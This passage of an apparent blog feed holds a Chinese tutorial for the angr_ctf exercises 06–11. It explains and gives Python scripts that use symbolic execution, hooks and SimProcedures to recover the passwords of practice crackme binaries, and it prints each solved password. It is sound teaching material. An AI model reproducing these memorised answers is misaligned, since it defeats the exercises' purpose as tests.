class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg2<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg3<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg4<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'NAXTHGNR'</span><span class="token comment">#b'JVSFTPWE'</span><span class="token comment">#b'LMGAUHWC'</span><span class="token comment">#b'XMDCPALU'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="06-angr-symbolic-dynamic-memory"><a href="#06-angr-symbolic-dynamic-memory" class="headerlink" title="06_angr_symbolic_dynamic_memory"></a>06_angr_symbolic_dynamic_memory</h3><p>动态内存符号化， malloc 创建的地址未知，直接随便设置一个地址作为堆地址即可，堆地址存储在 bss 段的一个地址中，所以给 bss 段的变量一个自定义地址，往自定义地址里写输入位向量</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./06_angr_symbolic_dynamic_memory'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x8048699</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>addr1 <span class="token operator">=</span> <span class="token number">0xABCC8A4</span>addr2 <span class="token operator">=</span> <span class="token number">0xABCC8AC</span>heap_ptr1 <span class="token operator">=</span> <span class="token number">0x12340</span>heap_ptr2 <span class="token operator">=</span> <span class="token number">0x12350</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr1<span class="token punctuation">,</span> heap_ptr1<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr2<span class="token punctuation">,</span> heap_ptr2<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>heap_ptr1<span class="token punctuation">,</span> arg1<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>heap_ptr2<span class="token punctuation">,</span> arg2<span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg2<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'UBDKLMBV'</span><span class="token comment">#b'UNOERNYS'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="07-angr-symbolic-file"><a href="#07-angr-symbolic-file" class="headerlink" title="07_angr_symbolic_file"></a>07_angr_symbolic_file</h3><p><code>%64s</code> 64字符，每个字符 8 字节，长度是 8 * 64</p><p>从文件中读字符串进行对比，需要将文件内容符号化进行仿真文件系统，并且插入这个文件</p><p>blank_state 的起始地址是从 open 开始</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./07_angr_symbolic_file'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x80488ED</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">64</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>passwd_file <span class="token operator">=</span> angr<span class="token punctuation">.</span>storage<span class="token punctuation">.</span>SimFile<span class="token punctuation">(</span><span class="token string">'OJKSQYDP.txt'</span><span class="token punctuation">,</span> content<span class="token operator">=</span>arg1<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token string">'OJKSQYDP.txt'</span><span class="token punctuation">,</span> passwd_file<span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'AZOMMMZM\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x04\x80\x08\x00\x00\x00\x00\x01\x00\x00\x00\x10\x01\x00\x00\x00\x04@\x01\x01\x01\x08\x80 \x00\x00\x10\x00\x00\x04\x01\x00\x00\x00\x00'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="08-angr-constraints"><a href="#08-angr-constraints" class="headerlink" title="08_angr_constraints"></a>08_angr_constraints</h3><p>比较函数使用了循环造成路径爆炸，直接 explore 运行到比较函数，通过添加约束来模拟比较过程而不实际执行比较过程</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./08_angr_constraints'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x8048625</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span><span class="token number">0x804A050</span><span class="token punctuation">,</span> arg1<span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token number">0x8048565</span><span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    res <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x804A050</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>res <span class="token operator">==</span> <span class="token string">'AUPDNNPROEZRJWKB'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'LGCRCDGJHYUNGUJB'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="09-angr-hooks"><a href="#09-angr-hooks" class="headerlink" title="09_angr_hooks"></a>09_angr_hooks</h3><p>写 hook 函数，程序的 scanf 不复杂，直接从头开始，hook 函数中获取输入值与固定值进行比较，程序中比较函数的逻辑是比较成功就返回 1 失败返回 0 ，这里也是同理成功就用位向量 BVV 表示返回 1，hook 的起始是 call 比较函数的地址，长度是 call 指令与下一条指令的距离</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./09_angr_hooks'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@project<span class="token punctuation">.</span>hook</span><span class="token punctuation">(</span><span class="token number">0x80486B3</span><span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x804A054</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> claripy<span class="token punctuation">.</span>If<span class="token punctuation">(</span>res <span class="token operator">==</span> <span class="token string">'XYMKBKUHNIQYNQXE'</span><span class="token punctuation">,</span> claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#ZXIDRXEORJOTFFJNWUFAOUBLOGLQCCGK</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="10-angr-simprocedures"><a href="#10-angr-simprocedures" class="headerlink" title="10_angr_simprocedures"></a>10_angr_simprocedures</h3><p>判断函数调用了很多次，所以不能直接通过设置地址来 hook，而需要通过函数名来 hook，也就是使用 <code>hook_symbol</code> 通过函数名 hook 到类中的 run 函数，run 一参是 self，其他参数可以直接用判断函数的参数，加载地址也需要用 self.state</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./10_angr_simprocedures'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">func</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span>        <span class="token keyword">return</span> claripy<span class="token punctuation">.</span>If<span class="token punctuation">(</span>res <span class="token operator">==</span> <span class="token string">'ORSDDWXHZURJRBDH'</span><span class="token punctuation">,</span> claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'check_equals_ORSDDWXHZURJRBDH'</span><span class="token punctuation">,</span> func<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#MSWKNJNAVTTOZMRY</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="11-angr-sim-scanf"><a href="#11-angr-sim-scanf" class="headerlink" title="11_angr_sim_scanf"></a>11_angr_sim_scanf</h3><p>hook scanf函数来应对复杂格式的输入，向scanf的参数中存入内容，并且将值存到 globals 全局变量插件中</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./11_angr_sim_scanf'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">func</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> format_string<span class="token punctuation">,</span> param0<span class="token punctuation">,</span> param1<span class="token punctuation">)</span><span class="token punctuation">:</span>        arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>        arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>param0<span class="token punctuation">,</span> arg1<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>param1<span class="token punctuation">,</span> arg2<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'solutions'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">)</span>project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'__isoc99_scanf'</span><span class="token punctuation">,</span> func<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    stored_solutions <span class="token operator">=</span> solution_state<span class="token punctuation">.</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'solutions'</span><span class="token punctuation">]</span>    scanf0_solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>stored_solutions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    scanf1_solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>stored_solutions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>scanf0_solution<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>scanf1_solution<span class="token punctuation">)</span><span class="token comment">#1448564819</span><span class="token comment">#1398294103</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;angr基础知识&quot;&gt;&lt;a href=&quot;#angr基础知识&quot; class=&quot;headerlink&quot; title=&quot;angr基础知识&quot;&gt;&lt;/a&gt;angr基础知识&lt;/h2&gt;&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="angr" scheme="https://starrysky1004.github.io/categories/angr/"/>
    
    
    <category term="angr" scheme="https://starrysky1004.github.io/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>2024网鼎杯cardmaster</title>
    <link href="https://starrysky1004.github.io/2024/12/04/2024-wang-ding-bei-cardmaster/2024-wang-ding-bei-cardmaster/"/>
    <id>https://starrysky1004.github.io/2024/12/04/2024-wang-ding-bei-cardmaster/2024-wang-ding-bei-cardmaster/</id>
    <published>2024-12-03T16:21:58.000Z</published>
    <updated>2024-12-03T16:41:47.959Z</updated>
    
